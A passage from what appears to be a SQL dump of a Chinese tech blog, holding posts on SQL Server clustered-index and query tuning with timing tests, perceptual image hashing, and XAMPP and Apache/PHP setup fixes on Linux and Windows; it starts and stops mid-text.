dateadd(day,-90,getdate())</p>\r\n\r\n<p>用时：53763毫秒(54秒)</p>\r\n\r\n<p>(3)将聚合索引建立在日期列(fariqi)上：</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt; dateadd(day,-90,getdate())</p>\r\n\r\n<p>用时：2423毫秒(2秒)</p>\r\n\r\n<p>虽然每条语句提取出来的都是25万条数据，各种情况的差异却是巨大的，特别是将聚集索引建立在日期列时的差异。事实上，如果您的数据库真</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的有1000万容量的话，把主键建立在ID列上，就像以上的第1、2种情况，在网页上的表现就是超时，根本就无法显示。这也是我摒弃ID列作为聚集索</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>引的一个最重要的因素。</p>\r\n\r\n<p>得出以上速度的方法是：在各个select语句前加：</p>\r\n\r\n<p>declare @d datetime</p>\r\n\r\n<p>set @d=getdate()</p>\r\n\r\n<p>并在select语句后加：</p>\r\n\r\n<p>select [语句执行花费时间(毫秒)]=datediff(ms,@d,getdate())</p>\r\n\r\n<p>2、只要建立索引就能显著提高查询速度</p>\r\n\r\n<p>事实上，我们可以发现上面的例子中，第2、3条语句完全相同，且建立索引的字段也相同;不同的仅是前者在fariqi字段上建立的是非聚合索引</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，后者在此字段上建立的是聚合索引，但查询速度却有着天壤之别。所以，并非是在任何字段上简单地建立索引就能提高查询速度。</p>\r\n\r\n<p>从建表的语句中，我们可以看到这个有着1000万数据的表中fariqi字段有5003个不同记录。在此字段上建立聚合索引是再合适不过了。在现实中</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，我们每天都会发几个文件，这几个文件的发文日期就相同，这完全符合建立聚集索引要求的：&ldquo;既不能绝大多数都相同，又不能只有极少数相同&rdquo;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的规则。由此看来，我们建立&ldquo;适当&rdquo;的聚合索引对于我们提高查询速度是非常重要的。</p>\r\n\r\n<p>3、把所有需要提高查询速度的字段都加进聚集索引，以提高查询速度</p>\r\n\r\n<p>上面已经谈到：在进行数据查询时都离不开字段的是&ldquo;日期&rdquo;还有用户本身的&ldquo;用户名&rdquo;。既然这两个字段都是如此的重要，我们可以把他们合</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>并起来，建立一个复合索引(compound index)。</p>\r\n\r\n<p>很多人认为只要把任何字段加进聚集索引，就能提高查询速度，也有人感到迷惑：如果把复合的聚集索引字段分开查询，那么查询速度会减慢吗</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>?带着这个问题，我们来看一下以下的查询速度(结果集都是25万条数据)：(日期列fariqi首先排在复合聚集索引的起始列，用户名neibuyonghu排在</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>后列)</p>\r\n\r\n<p>(1)select gid,fariqi,neibuyonghu,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-5-5&#39;</p>\r\n\r\n<p>查询速度：2513毫秒</p>\r\n\r\n<p>(2)select gid,fariqi,neibuyonghu,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-5-5&#39; and neibuyonghu=&#39;办公室&#39;</p>\r\n\r\n<p>查询速度：2516毫秒</p>\r\n\r\n<p>(3)select gid,fariqi,neibuyonghu,title from Tgongwen</p>\r\n\r\n<p>where neibuyonghu=&#39;办公室&#39;</p>\r\n\r\n<p>查询速度：60280毫秒</p>\r\n\r\n<p>从以上试验中，我们可以看到如果仅用聚集索引的起始列作为查询条件和同时用到复合聚集索引的全部列的查询速度是几乎一样的，甚至比用上</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>全部的复合索引列还要略快(在查询结果集数目一样的情况下);而如果仅用复合聚集索引的非起始列作为查询条件的话，这个索引是不起任何作用的</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>。当然，语句1、2的查询速度一样是因为查询的条目数一样，如果复合索引的所有列都用上，而且查询结果少的话，这样就会形成&ldquo;索引覆盖&rdquo;，因</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>而性能可以达到最优。同时，请记住：无论您是否经常使用聚合索引的其他列，但其前导列一定要是使用最频繁的列。</p>\r\n\r\n<p>(四)其他书上没有的索引使用经验总结</p>\r\n\r\n<p>1、用聚合索引比用不是聚合索引的主键速度快</p>\r\n\r\n<p>下面是实例语句：(都是提取25万条数据)</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39;</p>\r\n\r\n<p>使用时间：3326毫秒</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen where gid&lt;=250000</p>\r\n\r\n<p>使用时间：4470毫秒</p>\r\n\r\n<p>这里，用聚合索引比用不是聚合索引的主键速度快了近1/4。</p>\r\n\r\n<p>2、用聚合索引比用一般的主键作order by时速度快，特别是在小数据量情况下</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen order by fariqi</p>\r\n\r\n<p>用时：12936</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen order by gid</p>\r\n\r\n<p>用时：18843</p>\r\n\r\n<p>这里，用聚合索引比用一般的主键作order by时，速度快了3/10。事实上，如果数据量很小的话，用聚集索引作为排序列要比使用非聚集索引速</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>度快得明显的多;而数据量如果很大的话，如10万以上，则二者的速度差别不明显。</p>\r\n\r\n<p>3、使用聚合索引内的时间段，搜索时间会按数据占整个数据表的百分比成比例减少，而无论聚合索引使用了多少个</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-1-1&#39;</p>\r\n\r\n<p>用时：6343毫秒(提取100万条)</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-6-6&#39;</p>\r\n\r\n<p>用时：3170毫秒(提取50万条)</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39;</p>\r\n\r\n<p>用时：3326毫秒(和上句的结果一模一样。如果采集的数量一样，那么用大于号和等于号是一样的)</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-1-1&#39; and fariqi&lt;&#39;2004-6-6&#39;</p>\r\n\r\n<p>用时：3280毫秒</p>\r\n\r\n<p>4 、日期列不会因为有分秒的输入而减慢查询速度</p>\r\n\r\n<p>下面的例子中，共有100万条数据，2004年1月1日以后的数据有50万条，但只有两个不同的日期，日期精确到日;之前有数据50万条，有5000个不</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>同的日期，日期精确到秒。</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi&gt;&#39;2004-1-1&#39; order by fariqi</p>\r\n\r\n<p>用时：6390毫秒</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi&lt;&#39;2004-1-1&#39; order by fariqi</p>\r\n\r\n<p>用时：6453毫秒</p>\r\n\r\n<p>(五)其他注意事项</p>\r\n\r\n<p>&ldquo;水可载舟，亦可覆舟&rdquo;，索引也一样。索引有助于提高检索性能，但过多或不当的索引也会导致系统低效。过多的索引甚至会导致索引碎片。</p>\r\n\r\n<p>索引是从数据库中获取数据的最高效方式之一。95%的数据库性能问题都可以采用索引技术得到解决。</p>\r\n\r\n<p>1. 不要索引常用的小型表</p>\r\n\r\n<p>不要为小型数据表设置任何键，假如它们经常有插入和删除操作就更别这样作了。对这些插入和删除操作的索引维护可能比扫描表空间消耗更多</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的时间。</p>\r\n\r\n<p>2. 不要把社会保障号码(SSN)或身份证号码(ID)选作键</p>\r\n\r\n<p>永远都不要使用 SSN 或 ID 作为数据库的键。除了隐私原因以外，SSN 或 ID 需要手工输入。永远不要使用手工输入的键作为主键，因为一旦</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>你输入错误，你唯一能做的就是删除整个记录然后从头开始。</p>\r\n\r\n<p>3. 不要用用户的键</p>\r\n\r\n<p>在确定采用什么字段作为表的键的时候，可一定要小心用户将要编辑的字段。通常的情况下不要选择用户可编辑的字段作为键。这样做会迫使你</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>采取以下两个措施：</p>\r\n\r\n<p>4. 不要索引 memo/notes 字段和不要索引大型文本字段(许多字符)</p>\r\n\r\n<p>这样做会让你的索引占据大量的数据库空间</p>\r\n\r\n<p>5. 使用系统生成的主键</p>\r\n\r\n<p>假如你总是在设计数据库的时候采用系统生成的键作为主键，那么你实际控制了数据库的索引完整性。这样，数据库和非人工机制就有效地控制</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>了对存储数据中每一行的访问。</p>\r\n\r\n<p>采用系统生成键作为主键还有一个优点：当你拥有一致的键结构时，找到逻辑缺陷很容易。</p>\r\n\r\n<p>二、改善SQL语句</p>\r\n\r\n<p>很多人不知道SQL语句在SQL SERVER中是如何执行的，他们担心自己所写的SQL语句会被SQL SERVER误解。比如：</p>\r\n\r\n<p>select * from table1 where name=&#39;zhangsan&#39; and tID &gt; 10000</p>\r\n\r\n<p>和执行:</p>\r\n\r\n<p>select * from table1 where tID &gt; 10000 and name=&#39;zhangsan&#39;</p>\r\n\r\n<p>一些人不知道以上两条语句的执行效率是否一样，因为如果简单的从语句先后上看，这两个语句的确是不一样，如果tID是一个聚合索引，那么</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>后一句仅仅从表的10000条以后的记录中查找就行了;而前一句则要先从全表中查找看有几个name=&#39;zhangsan&#39;的，而后再根据限制条件条件tID&gt;10000</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>来提出查询结果。</p>\r\n\r\n<p>事实上，这样的担心是不必要的。SQL SERVER中有一个&ldquo;查询分析优化器&rdquo;，它可以计算出where子句中的搜索条件并确定哪个索引能缩小表扫</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>描的搜索空间，也就是说，它能实现自动优化。</p>\r\n\r\n<p>虽然查询优化器可以根据where子句自动的进行查询优化，但大家仍然有必要了解一下&ldquo;查询优化器&rdquo;的工作原理，如非这样，有时查询优化器</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>就会不按照您的本意进行快速查询。</p>\r\n\r\n<p>在查询分析阶段，查询优化器查看查询的每个阶段并决定限制需要扫描的数据量是否有用。如果一个阶段可以被用作一个扫描参数(SARG)，那么</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>就称之为可优化的，并且可以利用索引快速获得所需数据。</p>\r\n\r\n<p>SARG的定义：用于限制搜索的一个操作，因为它通常是指一个特定的匹配，一个值得范围内的匹配或者两个以上条件的AND连接。形式如下：</p>\r\n\r\n<p>列名 操作符 &lt;常数 或 变量&gt;</p>\r\n\r\n<p>或</p>\r\n\r\n<p>&lt;常数 或 变量&gt; 操作符列名</p>\r\n\r\n<p>列名可以出现在操作符的一边，而常数或变量出现在操作符的另一边。如：</p>\r\n\r\n<p>Name=&rsquo;张三&rsquo;</p>\r\n\r\n<p>价格&gt;5000</p>\r\n\r\n<p>5000&lt;价格</p>\r\n\r\n<p>Name=&rsquo;张三&rsquo; and 价格&gt;5000</p>\r\n\r\n<p>如果一个表达式不能满足SARG的形式，那它就无法限制搜索的范围了，也就是SQL SERVER必须对每一行都判断它是否满足WHERE子句中的所有条</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>件。所以一个索引对于不满足SARG形式的表达式来说是无用的。</p>\r\n\r\n<p>介绍完SARG后，我们来总结一下使用SARG以及在实践中遇到的和某些资料上结论不同的经验：</p>\r\n\r\n<p>1、Like语句是否属于SARG取决于所使用的通配符的类型</p>\r\n\r\n<p>如：name like &lsquo;张%&rsquo; ，这就属于SARG</p>\r\n\r\n<p>而：name like &lsquo;%张&rsquo; ,就不属于SARG。</p>\r\n\r\n<p>原因是通配符%在字符串的开通使得索引无法使用。</p>\r\n\r\n<p>2、or 会引起全表扫描</p>\r\n\r\n<p>如：Name=&rsquo;张三&rsquo; and 价格&gt;5000 符号SARG，</p>\r\n\r\n<p>而：Name=&rsquo;张三&rsquo; or 价格&gt;5000 则不符合SARG。</p>\r\n\r\n<p>使用or会引起全表扫描。</p>\r\n\r\n<p>3、非操作符、函数引起的不满足SARG形式的语句</p>\r\n\r\n<p>不满足SARG形式的语句最典型的情况就是包括非操作符的语句，如：NOT、!=、&lt;&gt;、!&lt;、!&gt;、NOT EXISTS、NOT IN、NOT LIKE等，另外还有函数</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>。下面就是几个不满足SARG形式的例子：</p>\r\n\r\n<p>ABS(价格)&lt;5000</p>\r\n\r\n<p>Name like &lsquo;%三&rsquo;</p>\r\n\r\n<p>有些表达式，如：</p>\r\n\r\n<p>WHERE 价格*2&gt;5000</p>\r\n\r\n<p>SQL SERVER也会认为是SARG，SQL SERVER会将此式转化为：</p>\r\n\r\n<p>WHERE 价格&gt;2500/2</p>\r\n\r\n<p>但我们不推荐这样使用，因为有时SQL SERVER不能保证这种转化与原始表达式是完全等价的。</p>\r\n\r\n<p>4、IN 的作用相当与OR</p>\r\n\r\n<p>语句：</p>\r\n\r\n<p>Select * from table1 where tid in (2,3)</p>\r\n\r\n<p>和</p>\r\n\r\n<p>Select * from table1 where tid=2 or tid=3</p>\r\n\r\n<p>是一样的，都会引起全表扫描，如果tid上有索引，其索引也会失效。</p>\r\n\r\n<p>5、尽量少用NOT</p>\r\n\r\n<p>6、exists 和 in 的执行效率是一样的</p>\r\n\r\n<p>很多资料上都显示说，exists要比in的执行效率要高，同时应尽可能的用not exists来代替not in。但事实上，我试验了一下，发现二者无论是</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>前面带不带not，二者之间的执行效率都是一样的。因为涉及子查询，我们试验这次用SQL SERVER自带的pubs数据库。运行前我们可以把SQL SERVER</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的statistics I/O状态打开。</p>\r\n\r\n<p>(1)select title,price from titles where title_id in</p>\r\n\r\n<p>(select title_id from sales where qty&gt;30)</p>\r\n\r\n<p>该句的执行结果为：</p>\r\n\r\n<p>表 &#39;sales&#39;。扫描计数 18，逻辑读 56 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>表 &#39;titles&#39;。扫描计数 1，逻辑读 2 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>(2)select title,price from titles where exists</p>\r\n\r\n<p>(select * from sales where sales.title_id=titles.title_id and qty&gt;30)</p>\r\n\r\n<p>第二句的执行结果为：</p>\r\n\r\n<p>表 &#39;sales&#39;。扫描计数 18，逻辑读 56 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>表 &#39;titles&#39;。扫描计数 1，逻辑读 2 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>我们从此可以看到用exists和用in的执行效率是一样的。</p>\r\n\r\n<p>7、用函数charindex()和前面加通配符%的LIKE执行效率一样</p>\r\n\r\n<p>前面，我们谈到，如果在LIKE前面加上通配符%，那么将会引起全表扫描，所以其执行效率是低下的。但有的资料介绍说，用函数charindex()来</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>代替LIKE速度会有大的提升，经我试验，发现这种说明也是错误的：</p>\r\n\r\n<p>select gid,title,fariqi,reader from tgongwen</p>\r\n\r\n<p>where charindex(&#39;刑侦支队&#39;,reader)&gt;0 and fariqi&gt;&#39;2004-5-5&#39;</p>\r\n\r\n<p>用时：7秒，另外：扫描计数 4，逻辑读 7155 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>select gid,title,fariqi,reader from tgongwen</p>\r\n\r\n<p>where reader like &#39;%&#39; + &#39;刑侦支队&#39; + &#39;%&#39; and fariqi&gt;&#39;2004-5-5&#39;</p>\r\n\r\n<p>用时：7秒，另外：扫描计数 4，逻辑读 7155 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>8、union并不绝对比or的执行效率高</p>\r\n\r\n<p>我们前面已经谈到了在where子句中使用or会引起全表扫描，一般的，我所见过的资料都是推荐这里用union来代替or。事实证明，这种说法对于</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>大部分都是适用的。</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39; or gid&gt;9990000</p>\r\n\r\n<p>用时：68秒。扫描计数 1，逻辑读 404008 次，物理读 283 次，预读 392163 次。</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39;</p>\r\n\r\n<p>union</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen where gid&gt;9990000</p>\r\n\r\n<p>用时：9秒。扫描计数 8，逻辑读 67489 次，物理读 216 次，预读 7499 次。</p>\r\n\r\n<p>看来，用union在通常情况下比用or的效率要高的多。</p>\r\n\r\n<p>但经过试验，笔者发现如果or两边的查询列是一样的话，那么用union则反倒和用or的执行速度差很多，虽然这里union扫描的是索引，而or扫描</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>的是全表。</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39; or fariqi=&#39;2004-2-5&#39;</p>\r\n\r\n<p>用时：6423毫秒。扫描计数 2，逻辑读 14726 次，物理读 1 次，预读 7176 次。</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-9-16&#39;</p>\r\n\r\n<p>union</p>\r\n\r\n<p>select gid,fariqi,neibuyonghu,reader,title from Tgongwen</p>\r\n\r\n<p>where fariqi=&#39;2004-2-5&#39;</p>\r\n\r\n<p>用时：11640毫秒。扫描计数 8，逻辑读 14806 次，物理读 108 次，预读 1144 次。</p>\r\n\r\n<p>9、字段提取要按照&ldquo;需多少、提多少&rdquo;的原则，避免&ldquo;select *&rdquo;</p>\r\n\r\n<p>我们来做一个试验：</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen order by gid desc</p>\r\n\r\n<p>用时：4673毫秒</p>\r\n\r\n<p>select top 10000 gid,fariqi,title from tgongwen order by gid desc</p>\r\n\r\n<p>用时：1376毫秒</p>\r\n\r\n<p>select top 10000 gid,fariqi from tgongwen order by gid desc</p>\r\n\r\n<p>用时：80毫秒</p>\r\n\r\n<p>由此看来，我们每少提取一个字段，数据的提取速度就会有相应的提升。提升的速度还要看您舍弃的字段的大小来判断。</p>\r\n\r\n<p>10、count(*)不比count(字段)慢</p>\r\n\r\n<p>某些资料上说：用*会统计所有列，显然要比一个世界的列名效率低。这种说法其实是没有根据的。我们来看：</p>\r\n\r\n<p>select count(*) from Tgongwen</p>\r\n\r\n<p>用时：1500毫秒</p>\r\n\r\n<p>select count(gid) from Tgongwen</p>\r\n\r\n<p>用时：1483毫秒</p>\r\n\r\n<p>select count(fariqi) from Tgongwen</p>\r\n\r\n<p>用时：3140毫秒</p>\r\n\r\n<p>select count(title) from Tgongwen</p>\r\n\r\n<p>用时：52050毫秒</p>\r\n\r\n<p>从以上可以看出，如果用count(*)和用count(主键)的速度是相当的，而count(*)却比其他任何除主键以外的字段汇总速度要快，而且字段越长</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>，汇总的速度就越慢。我想，如果用count(*)， SQL SERVER可能会自动查找最小字段来汇总的。当然，如果您直接写count(主键)将会来的更直接些</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>。</p>\r\n\r\n<p>11、order by按聚集索引列排序效率最高</p>\r\n\r\n<p>我们来看：(gid是主键，fariqi是聚合索引列)</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen</p>\r\n\r\n<p>用时：196 毫秒。 扫描计数 1，逻辑读 289 次，物理读 1 次，预读 1527 次。</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen order by gid asc</p>\r\n\r\n<p>用时：4720毫秒。 扫描计数 1，逻辑读 41956 次，物理读 0 次，预读 1287 次。</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen order by gid desc</p>\r\n\r\n<p>用时：4736毫秒。 扫描计数 1，逻辑读 55350 次，物理读 10 次，预读 775 次。</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen order by fariqi asc</p>\r\n\r\n<p>用时：173毫秒。 扫描计数 1，逻辑读 290 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>select top 10000 gid,fariqi,reader,title from tgongwen order by fariqi desc</p>\r\n\r\n<p>用时：156毫秒。 扫描计数 1，逻辑读 289 次，物理读 0 次，预读 0 次。</p>\r\n\r\n<p>从以上我们可以看出，不排序的速度以及逻辑读次数都是和&ldquo;order by 聚集索引列&rdquo; 的速度是相当的，但这些都比&ldquo;order by 非聚集索引列</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&rdquo;的查询速度是快得多的。</p>\r\n\r\n<p>同时，按照某个字段进行排序的时候，无论是正序还是倒序，速度是基本相当的。</p>\r\n',0,1437808407,0,0),(71,35,'感知哈希算法','<p>感知哈希算法（Perceptual hash algorithm）</p>\r\n\r\n<p>第一步，缩小尺寸。<br />\r\n将图片缩小到8x8的尺寸，总共64个像素。这一步的作用是去除图片的细节，只保留结构、明暗等基本信息，摒弃不同尺寸、比例带来的图片差异。<br />\r\n&nbsp;<br />\r\n第二步，简化色彩。<br />\r\n将缩小后的图片，转为64级灰度。也就是说，所有像素点总共只有64种颜色。</p>\r\n\r\n<p>第三步，计算平均值。<br />\r\n计算所有64个像素的灰度平均值。</p>\r\n\r\n<p>第四步，比较像素的灰度。<br />\r\n将每个像素的灰度，与平均值进行比较。大于或等于平均值，记为1；小于平均值，记为0。</p>\r\n\r\n<p>第五步，计算哈希值。<br />\r\n将上一步的比较结果，组合在一起，就构成了一个64位的整数，这就是这张图片的指纹。组合的次序并不重要，只要保证所有图片都采用同样次序就行了。</p>\r\n\r\n<p>得到指纹以后，就可以对比不同的图片，看看64位中有多少位是不一样的。在理论上，这等同于计算&quot;汉明距离&quot;（Hamming distance）。如果不相同的数据位不超过5，就说明两张图片很相似；如果大于10，就说明这是两张不同的图片。实际应用中，往往采用更强大的pHash算法和SIFT算法，它们能够识别图片的变形。只要变形程度不超过25%，它们就能匹配原图。这些算法虽然更复杂，但是原理与上面的简便算法是一样的，就是先将图片转化成Hash字符串，然后再进行比较。</p>\r\n\r\n<p>来源http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html</p>\r\n',0,1437813592,0,0),(72,36,'xampp1.6.6在fedora9下的启动问题','<p>fedora9下启动xampp1.6.6时遭遇：</p>\r\n\r\n<p>cat: error while loading shared libraries: libc.so.6: cannot open shared object file: No such file or directory<br />\r\n/bin/sh: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\nStarting XAMPP for Linux ...<br />\r\n/bin/bash: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\n/bin/bash: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\n/bin/bash: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\n/bin/bash: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\n/bin/bash: error while loading shared libraries: libdl.so.2: cannot open shared object file: No such file or directory<br />\r\nXAMPP for Linux started.</p>\r\n\r\n<p>解决办法：</p>\r\n\r\n<p>vi /opt/lampp/lampp<br />\r\n找到：export LD_ASSUME_KERNEL=2.2.5<br />\r\n改为：export LD_ASSUME_KERNEL=2.8.0<br />\r\n/opt/lampp/lampp start</p>\r\n',0,1437813992,0,0),(73,15,'本地环境 Ubuntu 下安装XAMPP，phpmyadmin无法正常访问解决办法','<p>环境说明：<br />\r\nUbuntu: 截止本文发布时，ubuntu的最新版本为12.04.本文所讲述故障也是发生于此版本环境下<br />\r\nXAMPP: xampp-linux-1.8.0.tar.gz<br />\r\n安装过程不细说，直接介绍安装完毕后访问http://localhost/phpmyadmin/时出现如下提示：<br />\r\nAccess forbidden!<br />\r\nNew XAMPP security concept:<br />\r\nAccess to the requested directory is only available from the local network.<br />\r\nThis setting can be configured in the file &ldquo;httpd-xampp.conf&rdquo;.<br />\r\n解决办法：<br />\r\n进入命令行模式，先将账户切换至root<br />\r\n$ sudo -s<br />\r\nvi打开需要编辑的httpd-xampp.conf文件<br />\r\n# vi /opt/lampp/etc/extra/httpd-xampp.conf<br />\r\n（vi如何操作，请查阅相关内容）<br />\r\n找到这段代码：<br />\r\n# since XAMPP 1.4.3<br />\r\n&lt;Directory &ldquo;/opt/lampp/phpmyadmin&rdquo;&gt;<br />\r\nAllowOverride AuthConfig Limit<br />\r\nOrder allow,deny<br />\r\nAllow from all<br />\r\n&lt;/Directory&gt;<br />\r\n为其增加一行Require all granted，最后如下所示：<br />\r\n# since XAMPP 1.4.3<br />\r\n&lt;Directory &ldquo;/opt/lampp/phpmyadmin&rdquo;&gt;<br />\r\nAllowOverride AuthConfig Limit<br />\r\nOrder allow,deny<br />\r\nAllow from all<br />\r\nRequire all granted<br />\r\n&lt;/Directory&gt;<br />\r\n保存并退出。重启XAMPP 。<br />\r\n操作完毕。</p>\r\n',0,1437888152,0,0),(74,23,'windows安装PHP5.4+Apache2.4+Mysql5.5','<p>最近听说PHP5.4速度很快，所以想建立一个本地环境测试下。我打算用本地windows xp sp3下安装PHP5.4.8、Apache2.4.3和Mysql5.5.28。</p>\r\n\r\n<p>首先去下载PHP、Apache和Mysql的最新版本。</p>\r\n\r\n<p>PHP5.4.8版本下载地址：http://windows.php.net/download/</p>\r\n\r\n<p>Mysql5.5.28版本下载地址：http://www.mysql.com/downloads/mysql/</p>\r\n\r\n<p>Apache2.4.3版本下载地址：http://www.apachelounge.com/download/</p>\r\n\r\n<p>下载Apache注意下在这个页面还要下载个DLL文件：php5apache2_4.dll-php-5.4-win32.zip（跟PHP的版本一定要对应）</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150726134250259933.jpg\" style=\"height:67px; width:420px\" /></p>\r\n\r\n<p>前期的准备工作已经完成。</p>\r\n\r\n<p><br />\r\n下面讲讲如何安装APache，这个是最麻烦的，其他的多简单。</p>\r\n\r\n<p>第一部分：安装Apache2.4.3</p>\r\n\r\n<p>1.下载回来的是解压文件，解压好放到要安装的位置。（我这里以D:\\Acpache24为例）</p>\r\n\r\n<p>2.打开Apache24\\conf下httpd.conf 文件，用记事本打开即可。</p>\r\n\r\n<p>（1）第37行ServerRoot &quot;c:/Apache24&quot;改为ServerRoot &ldquo;D:/Apache24&rdquo;；//Apache程序的位置。</p>\r\n\r\n<p>（2）第204行的ServerAdmin改不改无所谓；</p>\r\n\r\n<p>（3）第213行ServerName前面的&ldquo;#&rdquo;号去掉；</p>\r\n\r\n<p>（4）第237行DocumentRoot &quot;c:/Apache24/htdocs&quot;改为DocumentRoot &quot;D:/www&quot;；//网站的根目录</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 第238行&lt;Directory &quot;c:/Apache24/htdocs&quot;&gt;改为&lt;Directory &quot; D:/www &quot;&gt;；</p>\r\n\r\n<p>注意：这个WWW文件夹要自己去新建的，不建的话会报错的。</p>\r\n\r\n<p>（5）第271行DirectoryIndex index.html改为DirectoryIndex index.html index.php index.htm&nbsp;&nbsp; //支持更多的默认页</p>\r\n\r\n<p>（6）第354行 ScriptAlias /cgi-bin/ &quot;c:/Apache24/cgi-bin/&quot;改为ScriptAlias /cgi-bin/ &quot;d:/Apache24/cgi-bin/&quot;<br />\r\n（7）第370行&lt;Directory &quot;c:/Apache24/cgi-bin&quot;&gt;改为&lt;Directory &quot;D:/Apache24/cgi-bin&quot;&gt;<br />\r\n3.启动Apache。</p>\r\n\r\n<p>开始 --- 运行，输入cmd，打开命令提示符。接着输入d:回车cd Apache24\\bin回车httpd回车</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150726134321672085.jpg\" style=\"height:150px; width:420px\" /></p>\r\n\r\n<p>如果httpd.conf配置正确的话，输入httpd回车后是没有任何提示的。</p>\r\n\r\n<p>5.测试。你可以把Apache24\\htdocs目录下的index.html放到D:\\www目录下，用浏览器访问会出现&ldquo;It works&rdquo;那么就说明apache已经正确安装了。</p>\r\n\r\n<p>注意：不能关掉这个命令窗口，否则apache会关闭的。</p>\r\n\r\n<p>6.加入为windows的系统服务，让Apache自启动。</p>\r\n\r\n<p>（1）关闭3的那个httpd命令窗口，不然会报错的。</p>\r\n\r\n<p>（2）开始 --- 运行，输入cmd，再打开一个命令提示符。输入d:回车cd Apache24\\bin回车</p>\r\n\r\n<p>这里加入服务的命令为：httpd.exe -k install -n &quot;servicename&quot;</p>\r\n\r\n<p>servicename为Apache在windows的服务中的名字。例如：httpd.exe -k install -n &quot;Apache24&quot;</p>\r\n\r\n<p>输入httpd.exe -k install -n 